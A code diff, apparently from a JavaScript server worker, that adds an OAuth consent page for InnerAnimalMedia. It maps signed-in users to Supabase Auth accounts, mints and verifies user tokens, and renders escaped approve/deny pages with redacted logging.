+    typeof env.SUPABASE_ANON_KEY === 'string' && env.SUPABASE_ANON_KEY.trim()
+      ? env.SUPABASE_ANON_KEY.trim()
+      : '';
+  const apikey =
+    anon ||
+    (typeof env.SUPABASE_SERVICE_ROLE_KEY === 'string' && env.SUPABASE_SERVICE_ROLE_KEY.trim()
+      ? env.SUPABASE_SERVICE_ROLE_KEY.trim()
+      : '');
+  if (!apikey) return false;
+  const res = await fetch(`${origin}/auth/v1/user`, {
     headers: {
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'no-cache, no-store, must-revalidate',
+      Authorization: `Bearer ${accessToken}`,
+      apikey,
     },
   });
+  return res.ok;
+}
+
+async function adminFindSupabaseUserIdByEmail(env, email) {
+  const sr =
+    typeof env.SUPABASE_SERVICE_ROLE_KEY === 'string' ? env.SUPABASE_SERVICE_ROLE_KEY.trim() : '';
+  if (!sr || !email) return null;
+  const origin = resolveSupabaseRestOrigin(env);
+  const url = `${origin}/auth/v1/admin/users?email=eq.${encodeURIComponent(email)}`;
+  const res = await fetch(url, {
+    headers: { apikey: sr, Authorization: `Bearer ${sr}` },
+  });
+  if (!res.ok) return null;
+  const data = await res.json().catch(() => ({}));
+  const users = Array.isArray(data?.users) ? data.users : [];
+  const id = users[0]?.id;
+  return typeof id === 'string' && id ? id : null;
+}
+
+async function adminCreateSupabaseAuthUser(env, email, displayName) {
+  const sr =
+    typeof env.SUPABASE_SERVICE_ROLE_KEY === 'string' ? env.SUPABASE_SERVICE_ROLE_KEY.trim() : '';
+  if (!sr || !email) return null;
+  const origin = resolveSupabaseRestOrigin(env);
+  const res = await fetch(`${origin}/auth/v1/admin/users`, {
+    method: 'POST',
+    headers: {
+      apikey: sr,
+      Authorization: `Bearer ${sr}`,
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      email,
+      email_confirm: true,
+      user_metadata: { full_name: displayName || '' },
+    }),
+  });
+  if (!res.ok) {
+    if (res.status === 422 || res.status === 409) {
+      return adminFindSupabaseUserIdByEmail(env, email);
+    }
+    return null;
+  }
+  const row = await res.json().catch(() => ({}));
+  const id = row?.id || row?.user?.id;
+  return typeof id === 'string' && id ? id : null;
+}
+
+async function resolveSupabaseAuthSubjectForIamUser(env, iamUser) {
+  const email = String(iamUser?.email || '').trim().toLowerCase();
+  if (!email) return null;
+  let sid = await adminFindSupabaseUserIdByEmail(env, email);
+  if (!sid) {
+    sid = await adminCreateSupabaseAuthUser(env, email, iamUser?.name || '');
+  }
+  return sid;
+}
+
+async function getBearerForConsent(env, iamUser) {
+  const sid = await resolveSupabaseAuthSubjectForIamUser(env, iamUser);
+  if (!sid) return { error: 'no_supabase_user', bearer: null };
+  const email = String(iamUser?.email || '').trim();
+  let bearer = await mintSupabaseUserAccessToken(env, sid, email);
+  if (!bearer) return { error: 'jwt_secret_missing', bearer: null };
+  const ok = await verifySupabaseUserJwt(env, bearer);
+  if (!ok) return { error: 'jwt_mint_invalid', bearer: null };
+  return { error: null, bearer };
+}
+
+function consentApikeyHeader(env) {
+  const anon =
+    typeof env.SUPABASE_ANON_KEY === 'string' && env.SUPABASE_ANON_KEY.trim()
+      ? env.SUPABASE_ANON_KEY.trim()
+      : '';
+  if (anon) return anon;
+  const sr =
+    typeof env.SUPABASE_SERVICE_ROLE_KEY === 'string' ? env.SUPABASE_SERVICE_ROLE_KEY.trim() : '';
+  return sr || '';
+}
+
+async function fetchAuthorizationDetails(env, bearer, authorizationId) {
+  const authBase = supabaseAuthV1Base(env);
+  const apikey = consentApikeyHeader(env);
+  if (!apikey) return { ok: false, status: 503, json: null };
+  const res = await fetch(`${authBase}/oauth/authorizations/${encodeURIComponent(authorizationId)}`, {
+    headers: {
+      Authorization: `Bearer ${bearer}`,
+      apikey,
+    },
+  });
+  const json = await res.json().catch(() => null);
+  return { ok: res.ok, status: res.status, json };
+}
+
+async function postConsentDecision(env, bearer, authorizationId, action) {
+  const authBase = supabaseAuthV1Base(env);
+  const apikey = consentApikeyHeader(env);
+  if (!apikey) return { ok: false, status: 503, json: null };
+  const res = await fetch(
+    `${authBase}/oauth/authorizations/${encodeURIComponent(authorizationId)}/consent`,
+    {
+      method: 'POST',
+      headers: {
+        Authorization: `Bearer ${bearer}`,
+        apikey,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ action }),
+    },
+  );
+  const json = await res.json().catch(() => null);
+  return { ok: res.ok, status: res.status, json };
+}
+
+function consentMissingRequestHtml() {
+  return `<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Authorization request</title></head>
+<body>
+<p>Missing authorization request.</p>
+<p><a href="/auth/login">Back to sign in</a></p>
+</body></html>`;
+}
+
+function consentConfigErrorHtml(title, detail) {
+  return `<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>${escapeHtmlConsent(title)}</title></head>
+<body>
+<p>${escapeHtmlConsent(title)}</p>
+<p>${escapeHtmlConsent(detail)}</p>
+<p><a href="/auth/login">Back to sign in</a></p>
+</body></html>`;
+}
+
+function consentPageHtml(opts) {
+  const {
+    authorizationId,
+    clientName,
+    redirectUri,
+    scopes,
+    signedInEmail,
+    errorMessage,
+  } = opts;
+  const safeNext = `/api/auth/oauth/consent?authorization_id=${encodeURIComponent(authorizationId)}`;
+  const switchHref = `/auth/login?next=${encodeURIComponent(safeNext)}`;
+  const errBlock = errorMessage
+    ? `<p role="alert">${escapeHtmlConsent(errorMessage)}</p>`
+    : '';
+  return `<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Authorize InnerAnimalMedia</title></head>
+<body>
+<h1>Authorize InnerAnimalMedia</h1>
+${errBlock}
+<p><strong>${escapeHtmlConsent(clientName || 'OAuth client')}</strong> is requesting access.</p>
+<p>Redirect URI: ${escapeHtmlConsent(redirectUri || '')}</p>
+<p>Requested scopes: ${escapeHtmlConsent(scopes || '')}</p>
+<p>Signed in as ${escapeHtmlConsent(signedInEmail || '')} · <a href="${switchHref}">Switch account</a></p>
+<form method="post" action="/api/auth/oauth/consent" style="margin-top:1rem;">
+  <input type="hidden" name="authorization_id" value="${escapeHtmlConsent(authorizationId)}"/>
+  <button type="submit" name="_action" value="approve">Approve</button>
+  <button type="submit" name="_action" value="deny">Deny</button>
+</form>
+</body></html>`;
+}
+
+async function parseConsentInput(request, url) {
+  if (request.method === 'GET') {
+    return {
+      authorizationId: url.searchParams.get('authorization_id')?.trim() || '',
+      action: '',
+    };
+  }
+  const ct = (request.headers.get('Content-Type') || '').toLowerCase();
+  if (ct.includes('application/json')) {
+    try {
+      const j = await request.json();
+      const a = String(j.action || '').toLowerCase();
+      return {
+        authorizationId: String(j.authorization_id || '').trim(),
+        action: a === 'approve' || a === 'deny' ? a : '',
+      };
+    } catch {
+      return { authorizationId: '', action: '' };
+    }
+  }
+  try {
+    const fd = await request.formData();
+    const aid = String(fd.get('authorization_id') || '').trim();
+    const raw = String(fd.get('_action') || '').toLowerCase();
+    const action = raw === 'approve' || raw === 'deny' ? raw : '';
+    return { authorizationId: aid, action };
+  } catch {
+    return { authorizationId: '', action: '' };
+  }
+}
+
+export async function handleOAuthConsentPage(request, env) {
+  const url = new URL(request.url);
+
+  let authorizationId = '';
+  let postAction = '';
+  try {
+    const parsed = await parseConsentInput(request, url);
+    authorizationId = parsed.authorizationId;
+    postAction = parsed.action;
+  } catch {
+    authorizationId = '';
+    postAction = '';
+  }
+
+  const iamUser = await getAuthUser(request, env);
+  const authTail = authorizationIdTail(authorizationId);
+  const domain = safeEmailDomain(iamUser?.email);
+  const uidTail = iamUser?.id ? iamUserIdTail(iamUser.id) : null;
+
+  console.log(
+    JSON.stringify({
+      event: 'oauth.consent.received',
+      method: request.method,
+      authorization_id_tail: authTail,
+      authenticated: !!iamUser,
+      iam_user_id_tail: uidTail,
+      email_domain: domain,
+    }),
+  );
+
+  if (!authorizationId) {
+    return new Response(consentMissingRequestHtml(), {
+      status: 400,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Cache-Control': 'no-store',
+      },
+    });
+  }
+
+  if (!iamUser) {
+    const q = new URLSearchParams();
+    q.set('next', `/api/auth/oauth/consent?authorization_id=${encodeURIComponent(authorizationId)}`);
+    return redirectToAuthLogin(request, q.toString());
+  }
+
+  const bridge = await getBearerForConsent(env, iamUser);
+  if (bridge.error === 'jwt_secret_missing') {
+    return new Response(
+      consentConfigErrorHtml(
+        'Consent is not configured',
+        'Missing JWT signing secret for Supabase Auth bridge (SUPABASE_JWT_SECRET).',
+      ),
+      { status: 503, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } },
+    );
+  }
+  if (bridge.error === 'no_supabase_user') {
+    return new Response(
+      consentConfigErrorHtml(
+        'Could not prepare Supabase session',
+        'Your account email could not be matched to Supabase Auth (check SUPABASE_SERVICE_ROLE_KEY).',
+      ),
+      { status: 503, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } },
+    );
+  }
+  if (bridge.error === 'jwt_mint_invalid') {
+    return new Response(
+      consentConfigErrorHtml(
+        'Consent bridge rejected',
+        'Signed token was not accepted by Supabase Auth. Confirm JWT settings match this project (signing algorithm / SUPABASE_JWT_SECRET).',
+      ),
+      { status: 503, headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' } },
+    );
+  }
+
+  const bearer = bridge.bearer;
+
+  if (request.method === 'POST') {
+    const action = postAction;
+    if (!action) {
+      return new Response(consentMissingRequestHtml(), {
+        status: 400,
+        headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
+      });
+    }
+
+    const dec = await postConsentDecision(env, bearer, authorizationId, action);
+    const redir = dec.json?.redirect_url;
+    const safeLog = redir ? safeRedirectLog(redir) : { host: '', pathname: '' };
+
+    console.log(
+      JSON.stringify({
+        event: 'oauth.consent.submit',
+        authorization_id_tail: authTail,
+        decision: action,
+        next_redirect_host: safeLog.host,
+        next_redirect_path: safeLog.pathname,
+        consent_ok: !!dec.ok,
+      }),
+    );
+
+    if (dec.ok && redir) {
+      return Response.redirect(redir, 302);
+    }
+
+    const msg =
+      dec.json?.msg ||
+      dec.json?.error_description ||
+      dec.json?.error ||
+      `Consent request failed (${dec.status}).`;
+    const detail = await fetchAuthorizationDetails(env, bearer, authorizationId);
+    const j = detail.json || {};
+    const clientName = j.client?.name || j.client?.Client?.name;
+    const redirectUri = j.redirect_uri || '';
+    const scopes = j.scope || '';
+    return new Response(
+      consentPageHtml({
+        authorizationId,
+        clientName: clientName || 'OAuth client',
+        redirectUri: redirectUri || '',
+        scopes,
+        signedInEmail: iamUser.email || '',
+        errorMessage: typeof msg === 'string' ? msg : String(msg),
+      }),
+      {
+        status: 200,
+        headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
+      },
+    );
+  }
+
+  const detail = await fetchAuthorizationDetails(env, bearer, authorizationId);
+
+  if (detail.json?.redirect_url) {
+    const redir = detail.json.redirect_url;
+    const safeLog = safeRedirectLog(redir);
+    console.log(
+      JSON.stringify({
+        event: 'oauth.consent.auto_redirect',
+        authorization_id_tail: authTail,
+        next_redirect_host: safeLog.host,
+        next_redirect_path: safeLog.pathname,
+      }),
+    );
+    return Response.redirect(redir, 302);
+  }
+
+  const loaded = detail.ok && !!detail.json?.authorization_id;
+  const clientName = detail.json?.client?.name || '';
+  const scopes = detail.json?.scope || '';
+  const redirectUri = detail.json?.redirect_uri || '';
+
+  console.log(
+    JSON.stringify({
+      event: 'oauth.consent.details',
+      authorization_id_tail: authTail,
+      consent_details_loaded: loaded,
+      client_name: clientName || null,
+      scopes: scopes || null,
+      decision: null,
+      email_domain: domain,
+    }),
+  );
+
+  if (!detail.ok || !loaded) {
+    const errMsg =
+      detail.json?.msg ||
+      detail.json?.error_description ||
+      detail.json?.error ||
+      `Could not load authorization (${detail.status}).`;
+    return new Response(
+      consentPageHtml({
+        authorizationId,
+        clientName: '',
+        redirectUri: '',
+        scopes: '',
+        signedInEmail: iamUser.email || '',
+        errorMessage: typeof errMsg === 'string' ? errMsg : String(errMsg),
+      }),
+      {
+        status: 200,
+        headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
+      },
+    );
+  }
+
+  return new Response(
+    consentPageHtml({
+      authorizationId,
+      clientName,
+      redirectUri,
+      scopes,
+      signedInEmail: iamUser.email || '',
+      errorMessage: '',
+    }),
+    {
+      status: 200,
+      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
+    },
+  );
 }
